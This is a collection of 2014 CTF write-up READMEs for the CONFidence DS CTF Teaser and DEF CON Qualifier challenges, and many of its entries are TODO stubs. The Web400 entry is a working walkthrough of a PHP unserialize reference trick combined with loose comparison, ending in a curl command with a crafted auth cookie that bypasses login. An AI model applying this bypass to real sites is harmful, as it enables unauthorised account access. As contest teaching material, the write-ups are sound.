Round #2 | Money: $100 | Round verification: 86244b7964db766497590d826db87c8e
Lucky number: 873
Round #3 | Money: $100 | Round verification: 4f535ef3d98a142cee40ecf6d34a4334
Lucky number: 994
Round #4 | Money: $100 | Round verification: 02996452c102ef13939680754257460f
Lucky number: 178
Round #5 | Money: $100 | Round verification: 88f71ecb1561208166ec112cb6bc13c3
Lucky number: 217
Round #6 | Money: $100 | Round verification: 80510634961a4c985d07ff089b520310
Lucky number: 778
Round #7 | Money: $100 | Round verification: b5475dea706c3c7285568d68092c5a06
Lucky number: 610
Round #8 | Money: $100 | Round verification: a3e0645d43ac069fbc322d5cdbf692bf

[…]

Round #219 | Money: $100 | Round verification: 3d3955b4fee673bbffed2760b7e5f537
You won $100!
The lucky number was: 389
[enter] to continue...

Round #220 | Money: $195 | Round verification: 81aa91772881d915a951e72270f39291
Lucky number: 627
Round #221 | Money: $195 | Round verification: 71d8b1bba071056e5aa510e9b6dbe35d
Lucky number: 743
Round #222 | Money: $195 | Round verification: dfab6036861640d59479444df681ca9e
Lucky number: 165
Round #223 | Money: $195 | Round verification: 0cda534713cbfd4aa218bf2648b879d5
Lucky number: 183
Round #224 | Money: $195 | Round verification: 880091b15457a0a9c0922b9233bbbc52
You won $100!
The lucky number was: 1000
[enter] to continue...

Round #225 | Money: $290 | Round verification: 07f9716235a394eddf246f46ff814280
Lucky number: 245

[…]

Round #1684 | Money: $1335 | Round verification: 54a9309da2f4f6e26b40a6439ae209cf
You won $100!
The lucky number was: 128
[enter] to continue...

Round #1685 | Money: $1430 | Round verification: bcd4bd9ac16e16fe83d76b1831f7da2e
You won! Here's your reward: DSCTF_939da0eec884d9edddbe97b9f9e348dede7211d821a1b56069816d7bad6c0f2e

The lucky number was: 953
[enter] to continue...
```

The flag is `DSCTF_939da0eec884d9edddbe97b9f9e348dede7211d821a1b56069816d7bad6c0f2e`.

## Other write-ups

* <http://www.pwntester.com/blog/2014/04/27/dragonsector-crypto-100/>

# CONFidence DS CTF Teaser: Pwnable200

**Category:** Pwn
**Points:** 200
**Description:**

> Service at 23.253.207.179:10002 is running this [binary](pwn200) - pwn it!
> **Update:** New binary on 04/26 10:20: md5 is `2b98a1c9781098fbd5d3c6a69719963c`
> 10:23:38 <@Gynvael> ANNOUNCEMENT: pwn200 binary is now re-uploaded (sorry, we uploaded the wrong binary previously; the change is really small though)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by Daniel Bali](http://balidani.blogspot.com/2014/04/confidence-ds-ctf-pwn200-writeup.html)
* [Solution by Daniel Bali](https://gist.github.com/balidani/ab8429bc7b59af7bed8c)
* [Solution by mak`](http://lokalhost.pl/x/pwn200.py)
* [Solution by Gynvael Coldwind](https://gist.github.com/anonymous/53e6811a7c9e6f8bcf4f)
* [Solution by Bartol](https://gist.github.com/Bartol0/283564a864e270b554ef)

# CONFidence DS CTF Teaser

* [Main website](https://ctf.dragonsector.pl/)
* [Scoreboard](https://ctf.dragonsector.pl/?scoreboard)
* [@DragonSectorCTF on Twitter](https://twitter.com/DragonSectorCTF)

## Completed write-ups

* [Stegano50](stegano50)
* [Crypto100](crypto100)

## Incomplete write-ups

* [Pwnable200](pwnable200)
* [Reverse300](reverse300)
* [Web400](web400) (partial write-up for now)

# CONFidence DS CTF Teaser: Reverse300

**Category:** Reverse-engineering
**Points:** 300
**Description:**

> Run this [binary](re300) with the same username you are logged in with. Once you find a valid password and token, enter it below:
>
> Username: `[_]`
> Password: `[_]`
> Token: `[_]`
>
> **Update 04/26 16:15 CEST:** New binary - md5 is `cd1eb7ced07cc6f872537d0618630c0c` - new strings, but offsets stayed the same.
>
> **Update 04/26 21:33 CEST:**
> The allowed charset for password and token is `A-Za-z0-9`. Players with whitespaces in the name - please remove the w hitespaces in the solution, as shown below.
>
> **Hint 04/26 21:33 CEST:**
> Don’t lose your way in the SERPENTines.
>
> **Hint 04/27 15:00 CEST:**
> There seem to be different kinds of serpents out there - but you already have the right one, don’t you?

## Write-up

(TODO)

## Other write-ups

* none yet

# CONFidence DS CTF Teaser: Stegano50

**Category:** Stegano
**Points:** 50
**Description:**

> Find the hidden message in this [file](stegano50.pdf)

## Write-up

We’re provided with [a PDF file](stegano50.pdf) that mostly contains some _lorem ipsum_ filler text. The document has a watermark saying “No Flag Here!” and also contains this teaser:

> In facilisis et tortor commodo aliquam[ Your flag is not here ]olestie bibendum, leo nisi porttitor massa, id accumsan sapien libero id tellus.

Let’s take a look at the PDF’s meta data.

```bash
$ pdfinfo stegano50.pdf
Title:          polar bear during a snow storm
Subject:        <| tr AB .- |>
Keywords:       Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
Author:         KeiDii
Creator:        LaTeX /o/
Producer:       find mr.morse text
CreationDate:   Thu Mar 13 22:33:50 2014
ModDate:        Thu Mar 13 22:33:50 2014
Tagged:         no
Form:           none
Pages:          1
Encrypted:      no
Page size:      595.276 x 841.89 pts (A4)
File size:      38742 bytes
Optimized:      no
PDF version:    1.5
```

The ‘keywords’ section seems interesting. Let’s base64-decode `Tm9wZSAsIG5vdCBoZXJlIDspCg==`:

```
$ base64 --decode <<< 'Tm9wZSAsIG5vdCBoZXJlIDspCg=='
Nope , not here ;)
```

That would’ve been too easy! Moving on, the ‘title’ and ‘producer’ fields seem to hint that Morse code is somehow involved. The ‘subject’ field looks like an example of using [the `tr` command](http://unixhelp.ed.ac.uk/CGI/man-cgi?tr): `tr AB .-` means “replace all instances of `A` with `.` and all instances of `B` with `-`”.

Let’s try some other tricks first, though. Using `pdftotext` we can see if the flag is somehow hidden as text in the PDF:

```bash
$ pdftotext stegano50.pdf
```

This produces a file called `stegano50.txt`, which contains another teaser:

```
N

e!

er

oF
la
gH

e!
N

Close - but still not here !

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

L
```

It seems we’re on the right track.

After trying some different PDF to text converters, it turns out opening the PDF in [SumatraPDF](http://blog.kowalczyk.info/software/sumatrapdf/free-pdf-reader.html) on Windows and then saving it as a text file has different results than `pdftotext`. In that case, the output contains some more hidden text (note the `BABA […] AAABB` part):

```
NoFlagHere! NoFlagHere! NoFlagHere!
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Close - but still not here !
BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras faucibus odio ut metus vulputate, id laoreet magna
volutpat. Integer nec enim vel arcu porttitor egestas […]
```

The same text can be viewed by opening the PDF in [PDF.js](http://mozilla.github.io/pdf.js/web/viewer.html), and then inspecting the generated HTML, or logging `document.documentElement.textContent` to the developer tools console. The output for `pdftohtml stegano50.pdf` contained the text too.

Let’s take the `BABA […] AAABB` part and perform the suggested replacements using `tr`:

```bash
$ tr AB .- <<< 'BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB'
-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--
```

An [online Morse code decoder](http://morsecode.scphillips.com/jtranslator.html) decodes this to:

```
CONGRATULATIONS,FLAG:1NV151BL3M3554G3
```

And indeed, the flag is `1NV151BL3M3554G3`.

## Other write-ups

* <http://www.pwntester.com/blog/2014/04/27/dragonsector-pdf-stegano-50/>
* <http://blog.dul.ac/2014/04/DSCTF14/>

# CONFidence DS CTF Teaser: Web400

**Category:** Web
**Points:** 400
**Description:**

> Fiery Technologies has created a new login system, where all secret messages are encoded. Please, check if you can bypass the authorization and read dragon's private stuff: <http://23.253.207.102/>

## Write-up

The website says:

> **You're not logged in.**
>
> Welcome to our new security system. You can try the demo version of the script here. For sure you'll be pleased.
>
> Use below credentials to try out our unbreakable message system:
>
> « guest:guest »
>
> We'll be looking forward your order.

Logging in with username `guest` and password `guest`, we get another message:

> You're logged in as guest!
> Source code of our newest system is available here:
>
> [« demo.zip &raquo;](demo)

[Unzipping this `demo.zip` file](demo) reveals some parts of the website’s source code.

[`database.php`](demo/database.php) contains the following:

```php
<?php

$database = array(

  array(
    'username' => 'guest',
    'password' => '084e0343a0486ff05530df6c705c8bb4',
    'secret_message' =>
    'ae7d55f7e2af728e7408d50677324732bca66dbd49f7b5f02956a0cc948648c715c6e988c8a178ba0b3b7aea83911b4ba8560831af16bfc8c6aa0f30f94c4fd5013b63d44364ea6f365cf059a3c8f8a6887944152af1de6e187248595ab9956a7479890a5e6ed4e95ff7e136b54030f8c239b33d042f5811f76af989ef0bd09e2b0a5619179f9ec2790f3a89f249769a207619d3b4c8c7384d91429ed07820206fcd127dc6cb873bb19395eaa385799fda5cf3e8ff6d094a6c7a8cb385320083ce2494800b1195a727b2e0ebf3f88e9a3220600ca024d5ebdbd680b3e13c660a'
  ),

  array(
    'username' => 'dragon',
    'password' => '[put md5 of your secret password here]',
    'secret_message' =>
    '[order the full version of the script to get encryption module]'
  )

);
```

The first item checks out – `084e0343a0486ff05530df6c705c8bb4` is the MD5 hash of `guest`, the password for the `guest` account we just used to login. The second array item is missing the juicy info, but at least now we know the username of the account we’re supposed to hack in to: `dragon`.

[The `auth.php` file](demo/auth.php) determines whether a login was successful or not:

```php
$auth = $_COOKIE['auth'];
if(get_magic_quotes_gpc())
  $auth = stripslashes($auth);
$auth = unserialize($auth);

if(!is_array($auth))
  return false;

$auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password']).$secret_salt);

if($auth['hmac_t'] !== $auth['hmac'])
  return false;
```

As we can see, the value of the `auth` cookie gets `unserialize()`d. There is a subtle unsafe unserialization vulnerability here that allows us to bypass the `$auth['hmac_t'] === $auth['hmac'])` check: since we control the value of the `auth` cookie, we can control the value of `$auth`, [as long as it’s an array](demo/auth.php#L11-12).

The [PHP `serialize()` documentation](http://php.net/serialize) contains this nugget:

> `serialize()` handles all types, except the resource-type. You can even `serialize()` arrays that contain references to itself. Circular references inside the array/object you are serializing will also be stored. Any other reference will be lost.

In this case, we can construct a custom array with the expected `username`, `password`, and `hmac` fields, and then add a `hmac_t` field that references the `hmac` field directly. The value for the `hmac` field doesn’t even matter:

```bash
$ php -r '$a = array("username" => "dragon", "password" => "???", "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22%3F%3F%3F%22%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we effectively bypass the `$auth['hmac_t'] === $auth['hmac'])` check. We’re still not logged in however, because of this code:

```php
$message = '';

foreach($database as $row)
{
  if($row['username'] == $auth['username'])
  if($row['password'] == $auth['password'])
  {
    $message = $row['secret_message'];
    return true;
  }
}

return false;
```

We know the expected username is `dragon`, so the `if($row['username'] == $auth['username'])` check is not a problem. We still need to make sure `$row['password'] == $auth['password']` holds true, though. `$row['password']` holds the MD5 hash of the password for the user `dragon` – a value we don’t know. How can we make our `$auth['password']` value be equal to it without knowing the right value? Luckily, [PHP’s crazy `==` operator](http://gynvael.coldwind.pl/?id=492) is being used here rather than the more sensical `===`. This allows us to use a non-string value for `$auth['password']` that will still equal any string, such as the boolean `true`. (Seriously, check out that last link link for more examples. PHP is crazy.)

```bash
$ php -r '$a = array("username" => "dragon", "password" => true, "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we’re successfully logged in as the `dragon` user!

```bash
$ curl --cookie 'auth=a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D' 'http://23.253.207.102/' > message.html
```

The response ([available as `message.html`](message.html)) contains the following message:

```bash
$ hexdump -C -s 0x520 message.html | head -n 23
00000520  64 69 76 20 63 6c 61 73  73 3d 22 63 6f 6e 74 61  |div class="conta|
00000530  69 6e 65 72 22 3e 0a 83  b3 6a 91 15 3e 36 d6 45  |iner">...j..>6.E|
00000540  b3 cc 5b 24 e3 49 c4 d5  f8 6a dd 64 85 7e 1b 6d  |..[$.I...j.d.~.m|
00000550  6c 04 8a eb d5 47 bd c8  05 ab d8 64 8c 37 d6 45  |l....G.....d.7.E|
00000560  7b 03 4e 09 7d f4 bd 83  b3 6a 91 15 3e 53 26 47  |{.N.}....j..>S&G|
00000570  8f 0a 8b 32 e6 36 11 d8  ff ab e5 5e 8d 85 29 2a  |...2.6.....^..)*|
00000580  6b f4 8c 40 9b 4b 02 83  f9 b9 e6 63 82 37 2a 71  |k..@.K.....c.7*q|
00000590  b0 bb 83 37 d5 3b d7 9f  c2 ba ae ff 3e 36 d6 29  |...7.;......>6.)|
000005a0  6b bb 3c eb b0 44 db 9f  f4 6a d4 61 7f 8a 29 46  |k.<..D...j.a..)F|
000005b0  6d fd 91 39 94 37 11 d1  c0 ba e3 5e 8b 78 28 82  |m..9.7.....^.x(.|
000005c0  6b fd 91 39 a1 41 04 85  b3 bc e0 61 83 53 d8 6b  |k..9.A.....a.S.k|
000005d0  c1 0f 91 3a e1 f6 bd cc  05 af d7 32 40 81 17 7f  |...:.......2@...|
000005e0  ad 0e 80 3d dd 45 11 9e  09 b9 da 59 46 87 28 78  |...=.E.....YF.(x|
000005f0  b9 0b 90 f3 9b 29 05 c8  b3 90 dd 56 85 3d e2 30  |.....).....V.=.0|
00000600  90 0d 84 39 c7 4f cf 9c  ca 7b d7 2d 54 7d 19 40  |...9.O...{.-T}.@|
00000610  ac cc 52 fc d8 09 ce 97  f8 81 d5 57 82 78 1a 3e  |..R........W.x.>|
00000620  af fd 83 2c a6 0b 1a 8a  bc 73 93 33 44 83 17 7a  |...,.....s.3D..z|
00000630  c1 0a 57 eb b8 47 04 d1  e6 c5 a3 2e 55 48 1c 41  |..W..G......UH.A|
00000640  82 01 80 02 d5 05 d3 94  f7 7f a2 29 83 4e 1a 6b  |...........).N.k|
00000650  af fc 81 00 d8 37 03 c4  c5 80 ee 15 44 89 17 7a  |.....7......D..z|
00000660  c1 0a 58 07 a3 35 db 63  93 4a 70 f5 1e 16 b6 09  |..X..5.c.Jp.....|
00000670  4b 9b 1d 07 a3 44 db 0a  20 20 20 20 20 20 3c 2f  |K....D..      </|
00000680  64 69 76 3e 0a 20 20 20  20 3c 2f 64 69 76 3e 0a  |div>.    </div>.|
```

The message is garbled because it has been decrypted using the incorrect password we provided. Looks like we’re gonna have to reverse [the `printmsg()` function in `message.php`](demo/message.php).

(TODO)

The flag is `DrgnS{2971f86fc7a161d514e7dbdad5dbfa26}`.

## Other write-ups and resources

* [Write-up by Rentjong (auto-translated)](https://translate.google.com/translate?hl=en&sl=id&tl=en&u=http%3A%2F%2Frentjong-team.blogspot.com%2F2014%2F04%2Fconfidence-dragon-sector-ctf-teaser.html)
* [Solution by phiber](https://gist.github.com/anonymous/c40c5e90482eed1151e5)

# Contribution guide

Please take a moment to review this document in order to make the contribution process easy and effective for everyone involved.

## Adding a new write-up entry

1. Each CTF gets its own folder in the root of this repository. For example, ‘Foo Bar CTF 2014’ would get a folder named `foo-bar-ctf-2014`.
2. Every CTF challenge gets its own subfolder within that folder. For example, all files related to the ‘Foo Bar CTF 2014’ challenge named ‘Sucky sandbox’ would be located in `foo-bar-ctf-2014/sucky-sandbox`.
3. Every CTF challenge folder needs a Markdown-formatted `README.md` file, e.g. `foo-bar-ctf-2014/sucky-sandbox/README.md`. This file contains any details about the challenge, the main write-up itself, and links to other write-ups and resources. The folder should also contain the source files needed to reproduce the challenge.
4. Once you’re done adding the entry or making your changes, submit a pull request using the GitHub web interface.

## Changing an existing entry

1. Feel free to make any changes you see fit. Add a link to a write-up on your blog, add missing source files, clarify explanations in the write-up, or — if you’ve found a better way to solve a challenge — simplify the existing solution.
2. Once you’re done, submit a pull request using the GitHub web interface.

# DEF CON CTF Qualifier 2014: 100lines

**Category:** Jymbolia
**Points:** 2
**Description:**

> It's not broken, you just need more RAM.
> [http://services.2014.shallweplayaga.me/100lines_53ac15fc7aa93da92629d37a669e106c](100lines_53ac15fc7aa93da92629d37a669e106c)
> `100lines_53ac15fc7aa93da92629d37a669e106c.2014.shallweplayaga.me:20689 `

## Write-up

(TODO)

## Other write-ups

* <http://balidani.blogspot.com/2014/05/def-con-quals-2014-100lines-writeup.html>

# DEF CON CTF Qualifier 2014: 3dttt

**Category:** Baby’s First
**Points:** 1
**Description:**

> Play well and play fast.
> `3dttt_87277cd86e7cc53d2671888c417f62aa.2014.shallweplayaga.me:1234`

## Write-up

In this challenge you had to beat LegitBS’s bot in a game of 3D Tic-Tac-Toe. You had to get to a balance of +50 games.

Here is an example solution:

```python
import socket
import sys

def generate_combos():
  combos = []
  #all horizontal lines
  for grid in range(3):
    for row in range(3):
      combos.append([(0,row,grid), (1,row,grid), (2,row,grid)])

  for grid in range(3):
    for row in range(3):
      combos.append([(row,0,grid), (row,1,grid), (row,2,grid)])

  #all vertical lines
  for row in range(3):
    for col in range(3):
      combos.append([(row,col,0),(row,col,1),(row,col,2)])

  #les diagonnals in a same grid
  for grid in range(3):
    combos.append([(0,0,grid), (1,1,grid), (2,2,grid)])
    combos.append([(0,2,grid), (1,1,grid), (2,0,grid)])

  #diagonnals on the same plan
  for row in range(3):
    combos.append([(row,0,0), (row,1,1), (row,2,2)])
    combos.append([(0,row,0), (1,row,1), (2,row,2)])
    combos.append([(row,2,0), (row,1,1), (row,0,2)])
    combos.append([(0,row,2), (1,row,1), (2,row,0)])

  #diagonnal diagonnals?!
  combos.append([(0,0,0), (1,1,1), (2,2,2)])
  combos.append([(2,0,0), (1,1,1), (0,2,2)])
  combos.append([(0,2,0), (1,1,1), (2,0,2)])
  combos.append([(2,2,0), (1,1,1), (0,0,2)])

  return combos

def parse_board(data):

  my_moves = []
  his_moves = []
  all_moves = []

  lines = [line.strip() for line in data.split('\n') if line.find('|') != -1]
  clean_lines = [line.replace('0','') for line in lines]
  clean_lines = [line.replace('1','') for line in clean_lines]
  clean_lines = [line.replace('2','') for line in clean_lines]

  for idx, line in enumerate(clean_lines):
    if idx < 3:
      grid = 0
      row = idx
    elif idx < 6:
      grid = 1
      row = idx - 3
    else:
      grid = 2
      row = idx - 6
    cases = [case.strip() for case in line.split('|')]
    for idx, case in enumerate(cases):
      if case.find('X') != -1:
        my_moves.append((idx,row,grid))
        all_moves.append((idx,row,grid))
      elif case.find('O') != -1:
        his_moves.append((idx,row,grid))
        all_moves.append((idx,row,grid))
  return my_moves, his_moves, all_moves


def update_valid(combos, his_moves):
  for move in his_moves:
    for combo in combos:
      if move in combo:
        combos.remove(combo)

  return combos

def update_d_valid(combos, his_moves):
  for move in his_moves:
    for combo in combos:
      if move in combo:
        combos.remove(combo)

  return combos

def get_try(combos, my_moves, all_moves):

  best_count = 0
  best_combo = combos[0]
  for combo in combos:
    count = 0
    for move in my_moves:
      if move in combo:
        count +=1
    if count > best_count:
      best_count = count
      best_combo = combo

  for move in best_combo:
    if move not in all_moves:
      return move

  return None

def defensive_move(d_combos, his_moves, all_moves):

  danger_combo = []
  for combo in d_combos:
    count = 0
    for move in his_moves:
      if move in combo:
        count +=1
    if count == 2:
      danger_combo = combo

  for move in danger_combo:
    if move not in all_moves:
      return move

  return None

def get_try_apocalypse(used):

  for a in xrange(3):
    for b in xrange(3):
      for c in xrange(3):
        if (a,b,c) not in used:
          return (a,b,c)
  return None

HOST = '3dttt_87277cd86e7cc53d2671888c417f62aa.2014.shallweplayaga.me'
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

my_moves = []
his_moves = []
all_moves = []
combos = generate_combos()
d_combos = generate_combos()

new_round = True

while True:
  try:

    data = s.recv(1024)
    if "flag" in data:
      print data
      break

    if new_round or data.find("Let's play again") != -1:
      my_moves = []
      his_moves = []
      all_moves = []
      combos = generate_combos()
      d_combos = generate_combos()

      s.send("1,1,1\n")
      s.recv(1024)
      my_moves, his_moves, all_moves = parse_board(data)
      # Best starter moves according to first google result!
      # Trustworthy source for sure
      if (1,1,0) in his_moves:
        s.send("1,1,2\n")
      else:
        s.send("1,1,0\n")
      new_round = False
      continue

    my_moves, his_moves, all_moves = parse_board(data)
    combos = update_valid(combos, his_moves)
    d_combos = update_d_valid(d_combos, my_moves)
    a_try = defensive_move(d_combos, his_moves, all_moves)

    # If no defensive moves are needed go offense
    if a_try is None:
      a_try = get_try(combos, my_moves, all_moves)

    # If can't find a good offensive move...
    # close your eyes and point somewhere >_<
    if a_try is None:
      a_try = get_try_apocalypse(all_moves)

    # (1, 1, 1) ---> 1,1,1
    s.send(str(a_try).replace('(','').replace(')','').replace(' ','')+'\n')

  except Exception as e:
    print e
    print "exception im very out"
    break
```

## Other write-ups

* <https://vanned.info/3dttt.html>
* [Matir's write up](https://systemoverlord.com/blog/2014/05/21/def-con-22-ctf-quals-3dttt/)

# DEF CON CTF Qualifier 2014: bbgp

**Category:** Selir
**Points:** 2
**Description:**

> Pwn my router
> `bbgp_7cdbfdae936b3c6ed10588119a8279a0.2014.shallweplayaga.me:179`
> [http://services.2014.shallweplayaga.me/bbgp_7cdbfdae936b3c6ed10588119a8279a0](bbgp_7cdbfdae936b3c6ed10588119a8279a0)

## Write-up

(TODO)

## Other write-ups and resources

* <https://privatepaste.com/6afd54f16c>

# DEF CON CTF Qualifier 2014: blackbox

**Category:** Sirgoon
**Points:** 2
**Description:**

> Crack open the box at `blackbox_655bccf42ebf1d821ebf25e8464ea2e3.2014.shallweplayaga.me:10456`

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: byhd

**Category:** HJ
**Points:** 2
**Description:**

> Who hath lived like hacker's life and refused the normalness must be rewarded with straw, sticks and bricks.
> [http://services.2014.shallweplayaga.me/byhd_147e0accdae13428910e909704b21b11](byhd_147e0accdae13428910e909704b21b11)
> `byhd_147e0accdae13428910e909704b21b11.2014.shallweplayaga.me:9730`

## Write-up

(TODO)

## Other write-ups

* <http://zepvn.com/blog/defcon-ctf-quals-2014-byhd.php>
* [SkullSecurity](https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-byhd-reversing-a-huffman-tree)

# DEF CON CTF Qualifier 2014: choripan

**Category:** Vito Genovese
**Points:** 4
**Description:**

> `choripan_ff53019a701f0124987ed3bf169a1635.2014.shallweplayaga.me 6910`

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: dosfun4u

**Category:** Lightning
**Points:** 5
**Description:**

> Welcome to DOS, this is going to suck
> [http://services.2014.shallweplayaga.me/dosfun4u_5d712652e1d06a362f7fc6d12d66755b](dosfun4u_5d712652e1d06a362f7fc6d12d66755b)
> `dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me:8888`
>
> Hint: http://www.engadget.com/2014/05/17/game-of-thrones-author-explains-old-pc/ #dosfun4u #defcon #ctf #hint #yolo

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/nopple/ctf/tree/master/dosfun4u>

# DEF CON CTF Qualifier 2014: dosfun4u round 2

**Category:** Lightning
**Points:** 5
**Description:**

> Download dosfun4u and read the key off the harddrive
> [http://services.2014.shallweplayaga.me/dosfun4u_5d712652e1d06a362f7fc6d12d66755b](dosfun4u_5d712652e1d06a362f7fc6d12d66755b)
> `dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me:8888`

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: fritas

**Category:** Vito Genovese
**Points:** 2
**Description:**

> `fritas_91a318f87f384a080595696b3c73fc39.2014.shallweplayaga.me 6908`
>
> Hint: code, length = header.unpack 'CN' #fritas #hint #defcon #ctf

## Write-up

(TODO)

## Other write-ups and resources

* [Solution in Python by IdolfHatler](https://gist.github.com/IdolfHatler/d952bf797a4d71cddbba)

# DEF CON CTF Qualifier 2014: hackertool

**Category:** Baby’s First
**Points:** 1
**Description:**

> hey, we need to check that your connection works, torrent this file and md5 it
>
> http://services.2014.shallweplayaga.me/hackertool.torrent_fe3b8b75e9639d35e8ac1d9809726ee2
>
> KINDA A HINT FOR HACKERTOOL: http://imgur.com/XCtMjJ2

## Write-up

The challenge provided us with a .torrent file and told us to download it and use the md5 checksum of the file inside as flag. I first tried to straight up download the file but it was almost a 60gb download and it seemed to be throttled (which later got confirmed by the hint).

The torrent specification describes an optional field for md5 checksums of the files it contains (https://wiki.theory.org/BitTorrentSpecification) so I tried to read it, but alas, it was empty.

Then it hit me, the file was named `every_ip_address.txt` so it was probally a text file lisiting the entire IPV4 address range. So I wrote up a simple python script that iterates each address:
```python
for a in range(0,256):
	for b in range(0,256):
		for c in range(0,256):
			for d in range(0,256):
				string = "%s.%s.%s.%s" % (a,b,c,d)
				print string
```

Running it and piping the output to `md5sum` gave us the flag:
```
root@kali:~# python ip.py | md5sum
1a97f624cc74e4944350c04f5ae1fe8d
```

## Other write-ups

* [Matir’s writeup](https://systemoverlord.com/blog/2014/05/19/def-con-22-ctf-quals-hackertool/)

# DEF CON CTF Qualifier 2014: heap

**Category:** Baby’s First
**Points:** 1
**Description:**

> Heap feng shui not required: [http://services.2014.shallweplayaga.me/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c](babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c) : `babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me:4088`

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/iM6wCRqa>

# DEF CON CTF Qualifier 2014: medianoche

**Category:** Vito Genovese
**Points:** 3
**Description:**

> `medianoche_8b447fc7f99c257ee475381093eb6b25.2014.shallweplayaga.me 6909`

## Write-up

(TODO)

## Other write-ups

* [Solution in Python by IdolfHatler](https://gist.github.com/IdolfHatler/d952bf797a4d71cddbba)

# DEF CON CTF Qualifier 2014: nonameyet

**Category:** HJ
**Points:** 3
**Description:**

> I claim no responsibility for the things posted here. `nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me:80`

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: polyglot

**Category:** Gynophage
**Points:** 4
**Description:**

> Just open `/flag`, and write it to stdout. How hard could it be?
>
> `polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000`
>
> Password: `w0rk_tHaT_tAlEnTeD_t0nGu3`

## Write-up

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/05/18/defcon-2014-quals--polyglot/>
* <https://gist.github.com/IdolfHatler/d952bf797a4d71cddbba>

# DEF CON CTF Qualifier 2014

* [Main website](https://2014.legitbs.net/)
* [Explanation of category names](https://2014.legitbs.net/scoreboard/categories)
* [Scoreboard](https://2014.legitbs.net/scoreboard)
* [Scoreboard data dump](https://blog.legitbs.net/2014/05/quals-2014.html)
* [@legitbs_ctf on Twitter](https://twitter.com/legitbs_ctf)
* [DEF CON CTF Qualifier 2014 @ CTFtime.org](https://ctftime.org/event/129)
* [Source code for challenges on GitHub (to be added after DEF CON Finals 2014)](https://github.com/legitbs/quals-2014)

## Completed write-ups

* [3dttt](3dttt)
* [routarded](routarded)
* [zombies](zombies)

## Incomplete write-ups

* [100lines](100lines)
* [bbgp](bbgp)
* [blackbox](blackbox)
* [byhd](byhd)
* [choripan](choripan)
* [dosfun4u](dosfun4u)
* [dosfun4u round 2](dosfun4u-round-2)
* [fritas](fritas)
* [hackertool](hackertool)
* [heap](heap)
* [medianoche](medianoche)
* [nonameyet](nonameyet)
* [polyglot](polyglot)
* [rebaby](rebaby)
* [sftp](sftp)
* [shitsco](shitsco)
* [sick](sick)
* [turdedo](turdedo)

# DEF CON CTF Qualifier 2014: rebaby

**Category:** Jymbolia
**Points:** 3
**Description:**

> Just run it and you get the flag. Might be a bit slow.

## Write-up

(TODO)

## Other write-ups

* (none yet)

# DEF CON CTF Qualifier 2014: routarded

**Category:** Baby’s First
**Points:** 1
**Description:**

> Wow, they forwarded http on a router with default creds?
>
> http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/

## Write-up

The hint mentioned default credentials, so we tried some default credentials. After some trying, we found out leaving the username field empty and entering `admin` for the password successfully logged us in.

